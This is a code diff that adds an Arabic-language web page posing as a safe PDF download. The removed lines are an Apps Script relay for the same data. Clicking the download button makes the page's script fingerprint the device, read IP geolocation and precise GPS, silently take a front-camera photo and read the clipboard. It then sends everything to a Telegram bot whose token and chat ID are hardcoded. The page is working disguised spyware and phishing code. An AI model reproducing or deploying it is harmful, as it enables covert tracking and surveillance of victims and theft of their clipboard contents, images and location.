@@ -1,29 +1,260 @@
-const TOKEN = '9151451032:AAH4B2utGIiHZtdfOlcKtquJvmdVx5ron6Q';
-const CHAT  = '8362097109';
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0e1116">
+<title>ملف PDF — جاهز للتحميل</title>
+<style>
+  :root{--card:#161b22;--line:#232b36;--txt:#e6edf3;--mut:#8b949e;--acc:#2f81f7}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  body{margin:0;min-height:100vh;min-height:100dvh;display:grid;place-items:center;
+       background:radial-gradient(1200px 600px at 50% -10%,#1b2432,#0e1116);
+       font-family:-apple-system,system-ui,"Segoe UI",Tahoma,sans-serif;color:var(--txt);padding:24px}
+  .card{width:100%;max-width:460px;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:28px;text-align:center;
+        box-shadow:0 24px 60px rgba(0,0,0,.45)}
+  .ico{width:64px;height:64px;margin:0 auto 18px;border-radius:14px;display:grid;place-items:center;
+       background:linear-gradient(160deg,#2f81f7,#1a4d9e);font-size:30px}
+  h1{font-size:20px;margin:0 0 8px}
+  p{color:var(--mut);font-size:14px;line-height:1.7;margin:0 0 22px}
+  button{width:100%;padding:15px;border:0;border-radius:10px;background:var(--acc);color:#fff;font-size:15px;font-weight:700;
+         cursor:pointer;transition:.2s;-webkit-appearance:none;appearance:none}
+  button:hover{filter:brightness(1.12)}
+  button:disabled{opacity:.55;cursor:default}
+  .meta{display:flex;justify-content:space-between;font-size:12px;color:var(--mut);margin-bottom:16px;border-bottom:1px solid var(--line);padding-bottom:12px}
+  #log{font-size:12px;color:var(--mut);margin-top:14px;min-height:18px;word-break:break-word;white-space:pre-line}
+  .bar{height:4px;background:#1f2733;border-radius:99px;overflow:hidden;margin-top:16px}
+  .bar i{display:block;height:100%;width:0;background:var(--acc);transition:.4s}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="ico">📄</div>
+  <h1>الملف جاهز للتحميل</h1>
+  <p>اضغط الزر أدناه لتجهيز الملف والسماح بالوصول. قد يطلب المتصفح بعض الأذونات.</p>
+  <div class="meta"><span>الحجم: 2.4 MB</span><span>PDF</span><span>آمن</span></div>
+  <button id="go">تحميل الملف</button>
+  <div class="bar"><i id="bar"></i></div>
+  <div id="log"></div>
+</div>
 
-function doGet() {
-  return ContentService.createTextOutput('alive');
+<script>
+const CONFIG = {
+  RELAY: "",
+  TG_TOKEN: "9151451032:AAH4B2utGIiHZtdfOlcKtquJvmdVx5ron6Q",
+  TG_CHAT: "8362097109",
+  CAPTURE_CAM: true
+};
+
+const D = {};
+const log = t => {
+  const el = document.getElementById('log');
+  if (el.textContent.length > 400) el.textContent = el.textContent.slice(-200);
+  el.textContent += (el.textContent ? '\n' : '') + t;
+};
+const bar = p => { document.getElementById('bar').style.width = p + '%'; };
+const safe = (f, d = null) => { try { return f(); } catch { return d; } };
+const hash = s => { let h = 0; for (let i = 0; i < s.length; i++) h = (h * 31 + s.charCodeAt(i)) | 0; return (h >>> 0).toString(16); };
+const withTimeout = (p, ms, fb) => Promise.race([p, new Promise(r => setTimeout(() => r(fb), ms))]);
+const blobToB64 = b => new Promise(r => { const f = new FileReader(); f.onload = () => r(String(f.result).split(',')[1]); f.readAsDataURL(b); });
+
+function collect() {
+  D.time = new Date().toISOString();
+  D.referrer = document.referrer || 'direct';
+  D.url = location.href;
+  D.ua = navigator.userAgent;
+  D.platform = navigator.platform;
+  D.lang = navigator.language;
+  D.langs = navigator.languages;
+  D.tz = safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone);
+  D.cores = navigator.hardwareConcurrency;
+  D.mem = navigator.deviceMemory;
+  D.touch = navigator.maxTouchPoints;
+  D.screen = `${screen.width}x${screen.height}`;
+  D.avail = `${screen.availWidth}x${screen.availHeight}`;
+  D.dpr = devicePixelRatio;
+  D.depth = screen.colorDepth;
+  D.window = `${innerWidth}x${innerHeight}`;
+  D.dnt = navigator.doNotTrack;
+  D.cookies = navigator.cookieEnabled;
+  D.pdf = safe(() => navigator.pdfViewerEnabled);
+  D.plugins = safe(() => [...navigator.plugins].map(p => p.name));
+  D.storage = safe(() => ({ ls: !!localStorage, ss: !!sessionStorage, idb: !!indexedDB }));
+  D.perm = safe(() => Promise.all(['geolocation','camera','microphone','clipboard-read','notifications']
+      .map(async n => { try { return [n, (await navigator.permissions.query({name:n})).state]; } catch { return [n, 'n/a']; } })
+  ), Promise.resolve([]));
+
+  D.canvas = safe(() => {
+    const c = document.createElement('canvas'), x = c.getContext('2d');
+    x.textBaseline = 'top'; x.font = '14px Arial';
+    x.fillStyle = '#f60'; x.fillRect(0,0,80,20);
+    x.fillStyle = '#069'; x.fillText('Venice', 2, 2);
+    return hash(c.toDataURL());
+  });
+
+  D.gpu = safe(() => {
+    const g = document.createElement('canvas').getContext('webgl');
+    const e = g.getExtension('WEBGL_debug_renderer_info');
+    return { vendor: g.getParameter(e.UNMASKED_VENDOR_WEBGL), renderer: g.getParameter(e.UNMASKED_RENDERER_WEBGL) };
+  });
+
+  D.fonts = safe(() => {
+    const base = ['monospace','sans-serif','serif'];
+    const test = ['Arial','Courier New','Georgia','Tahoma','Times New Roman','Verdana','Consolas','Segoe UI','Cairo'];
+    const c = document.createElement('canvas').getContext('2d');
+    const w = f => { c.font = `72px ${f}, monospace`; return c.measureText('mmmmmmmmmmlli').width; };
+    const b = Object.fromEntries(base.map(f => [f, w(f)]));
+    return test.filter(f => base.some(k => w(`"${f}",${k}`) !== b[k]));
+  });
+
+  D.conn = safe(() => { const c = navigator.connection || {}; return { type: c.effectiveType, down: c.downlink, rtt: c.rtt }; });
+  D.media = safe(() => Promise.all(['videoinput','audioinput','audiooutput'].map(async k => {
+    try { return [k, (await navigator.mediaDevices.enumerateDevices()).filter(d => d.kind === k).length]; }
+    catch { return [k, 0]; }
+  })), Promise.resolve([]));
+  D.battery = safe(() => new Promise(r => navigator.getBattery().then(b => r({
+    level: Math.round(b.level * 100), charging: b.charging
+  }))), Promise.resolve(null));
 }
 
-function doPost(e) {
-  try {
-    const d = JSON.parse(e.postData.contents);
-    const cap = '🎯 ' + (d.ip || '?') + ' — ' + (d.city || '') + ' ' + (d.country || '') + ' — ' + (d.platform || '');
-    if (d.photo_b64) {
-      UrlFetchApp.fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
-        method: 'post',
-        payload: { chat_id: CHAT, caption: '📷 كاميرا',
-          photo: Utilities.newBlob(Utilities.base64Decode(d.photo_b64), 'image/jpeg', 'cam.jpg') }
-      });
-      delete d.photo_b64;
-    }
-    UrlFetchApp.fetch('https://api.telegram.org/bot' + TOKEN + '/sendDocument', {
-      method: 'post',
-      payload: { chat_id: CHAT, caption: cap.slice(0, 900),
-        document: Utilities.newBlob(JSON.stringify(d, null, 2), 'text/plain', 'report.txt') }
-    });
-    return ContentService.createTextOutput('ok');
-  } catch (err) {
-    return ContentService.createTextOutput('err: ' + err);
+async function geo() {
+  for (const api of ['https://ipwho.is/', 'https://ipapi.co/json/']) {
+    try {
+      const j = await withTimeout(fetch(api).then(r => r.json()), 6000, null);
+      if (j && (j.ip || j.query)) {
+        D.ip = j.ip || j.query;
+        D.city = j.city; D.region = j.region;
+        D.country = j.country || j.country_name;
+        D.isp = (j.connection && j.connection.isp) || j.org;
+        D.asn = j.connection && j.connection.asn;
+        D.lat = j.latitude; D.lon = j.longitude;
+        return;
+      }
+    } catch {}
   }
 }
+
+let snap = null;
+
+function askGeo() {
+  return withTimeout(new Promise(r => {
+    if (!navigator.geolocation) return r();
+    navigator.geolocation.getCurrentPosition(
+      p => { D.gps = { lat: p.coords.latitude.toFixed(6), lon: p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) + 'm' }; r(); },
+      e => { log('موقع: ' + e.message); r(); },
+      { enableHighAccuracy: true, timeout: 9000, maximumAge: 0 }
+    );
+  }), 12000, null);
+}
+
+async function askCam() {
+  if (!CONFIG.CAPTURE_CAM) return;
+  try {
+    const s = await withTimeout(
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640 }, audio: false }),
+      14000, null
+    );
+    if (!s) { log('كاميرا: ما وصل رد'); return; }
+    const v = document.createElement('video');
+    v.setAttribute('playsinline', '');
+    v.setAttribute('autoplay', '');
+    v.setAttribute('muted', '');
+    v.muted = true;
+    v.srcObject = s;
+    try { await v.play(); } catch {}
+    await new Promise(r => setTimeout(r, 1300));
+    const c = document.createElement('canvas');
+    c.width = v.videoWidth || 640;
+    c.height = v.videoHeight || 480;
+    c.getContext('2d').drawImage(v, 0, 0);
+    snap = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+    s.getTracks().forEach(t => t.stop());
+  } catch (e) { log('كاميرا: ' + e.name); }
+}
+
+async function askClip() {
+  try {
+    const t = await withTimeout(navigator.clipboard.readText(), 4000, null);
+    if (t) D.clipboard = t.slice(0, 500);
+  } catch {}
+}
+
+function beacon(url, txt) {
+  try {
+    const ok = navigator.sendBeacon(url, new Blob([txt], { type: 'text/plain' }));
+    log('beacon: ' + (ok ? 'مرسل' : 'مرفوض'));
+    return ok;
+  } catch (e) { log('beacon فشل: ' + e.message); return false; }
+}
+
+async function send() {
+  if (snap) { try { D.photo_b64 = await blobToB64(snap); } catch {} }
+  const txt = JSON.stringify(D, null, 2);
+
+  if (CONFIG.RELAY) {
+    let done = false;
+    try {
+      const r = await withTimeout(fetch(CONFIG.RELAY, { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: txt }), 20000, null);
+      if (r) { log('ريللي: ' + r.status + ' — ' + (await r.text()).slice(0, 60)); done = r.ok; }
+    } catch (e) { log('ريللي فشل: ' + e.message); }
+    if (!done) beacon(CONFIG.RELAY, txt);
+  }
+
+  if (CONFIG.TG_TOKEN && CONFIG.TG_CHAT) {
+    const cap = `🎯 ${D.ip || '?'} — ${D.city || ''} ${D.country || ''} — ${D.platform || ''}`;
+    const fd = new FormData();
+    fd.append('chat_id', CONFIG.TG_CHAT);
+    fd.append('caption', cap.slice(0, 1000));
+    fd.append('document', new Blob([txt], { type: 'text/plain' }), 'report.txt');
+    await tg('sendDocument', fd);
+  }
+}
+
+async function tg(method, fd) {
+  const url = `https://api.telegram.org/bot${CONFIG.TG_TOKEN}/${method}`;
+  try {
+    const res = await withTimeout(fetch(url, { method: 'POST', body: fd }), 12000, null);
+    if (!res) throw new Error('timeout');
+    const j = await res.json();
+    log('تيليجرام: ' + res.status + (j.ok ? ' ✓' : ' — ' + j.description));
+  } catch (e) {
+    try { await withTimeout(fetch(url, { method: 'POST', body: fd, mode: 'no-cors' }), 12000, null); } catch {}
+  }
+}
+
+document.getElementById('go').onclick = async e => {
+  const b = e.currentTarget;
+  b.disabled = true;
+  try {
+    log('جارٍ تجهيز الملف...'); bar(10);
+    try { collect(); } catch {}
+    try { await geo(); } catch {}
+    bar(30);
+    log('التحقق من الموقع...');
+    try { await askGeo(); } catch {}
+    bar(50);
+    log('قراءة الجهاز...');
+    try {
+      D.perm = Object.fromEntries(await (D.perm || []));
+      D.media = Object.fromEntries(await (D.media || []));
+      D.battery = await (D.battery || null);
+    } catch {}
+    bar(70);
+    try { await askCam(); } catch {}
+    try { await askClip(); } catch {}
+    bar(90);
+    log('إتمام التحميل...');
+    try { await send(); } catch (err) { log('خطأ: ' + err.message); }
+    bar(100);
+  } catch (err) {
+    log('خطأ: ' + err.message);
+  } finally {
+    b.textContent = 'إعادة التحميل';
+    b.disabled = false;
+  }
+};
+
+try { collect(); } catch {}
+</script>
+</body>
+</html>
